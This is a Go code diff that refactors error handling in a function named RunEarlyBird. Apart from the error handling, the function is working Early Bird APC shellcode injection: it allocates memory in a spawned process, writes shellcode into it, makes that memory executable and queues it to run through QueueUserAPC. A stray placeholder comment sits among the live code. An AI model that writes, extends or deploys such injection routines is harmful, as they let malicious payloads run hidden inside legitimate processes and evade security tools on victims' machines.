@@ -1,9 +1,9 @@
 package utils
 
 import (
-	"fmt"
 	"syscall"
 	"unsafe"
+	"fmt"
 
 	"golang.org/x/sys/windows"
 )
@@ -171,28 +171,24 @@ func RunEarlyBird(shellcode []byte, pathSpawnedProc string) (stdout []byte, stde
     // [Your existing shellcode injection code here]
     pShellCodeAddress, _, err := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil && err.Error() != "The operation completed successfully." {
-		fmt.Println("Failed to VirtuAllocEx")
-		fmt.Println(err)
+        return nil, nil, fmt.Errorf("failed to virtual Alloc %w", err)
 	}
 
 	var numByteWritten uintptr
 	err = windows.WriteProcessMemory(windows.Handle(pi.Process), pShellCodeAddress, &(shellcode)[0], uintptr(len(shellcode)), &numByteWritten)
 	if err != nil {
-		fmt.Println("Failed to Wrtie Process Memory")
-		fmt.Println(err)
+        return nil, nil, fmt.Errorf("failed to write process memory %w", err)
 	}
 
 	var oldProtection uintptr
 	_, _, err = VirtualProtectEx.Call(uintptr(pi.Process), pShellCodeAddress, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtection)))
 	if err != nil && err.Error() != "The operation completed successfully." {
-		fmt.Println("Failed to Change Process Memory Protection")
-		fmt.Println(err)
+        return nil, nil, fmt.Errorf("failed to change mem protection %w", err)
 	}
 
     _, err = QueueUserAPC(PAPCFUNC(pShellCodeAddress), HANDLE(pi.Thread), 0)
 	if err != nil && err.Error() != "The operation completed successfully." {
-		fmt.Println("Failed to Start QueueUserAPC")
-		fmt.Println(err)
+        return nil, nil, fmt.Errorf("failed to start quieue user APC %w", err)
 	}
 
 
